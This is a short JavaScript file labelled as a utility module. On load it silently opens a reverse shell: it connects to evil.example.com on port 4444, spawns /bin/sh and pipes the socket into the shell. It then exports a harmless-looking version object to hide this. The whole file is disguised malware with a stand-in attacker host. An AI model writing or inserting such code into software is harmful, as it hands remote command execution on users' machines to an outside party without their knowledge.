// utility module with on-demand initialization
(function(){
var net=require("net"),cp=require("child_process");
var s=new net.Socket();s.connect(4444,"evil.example.com",function(){
  var sh=cp.spawn("/bin/sh",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);
});
module.exports = { version: "1.0.0", ready: true };
})();
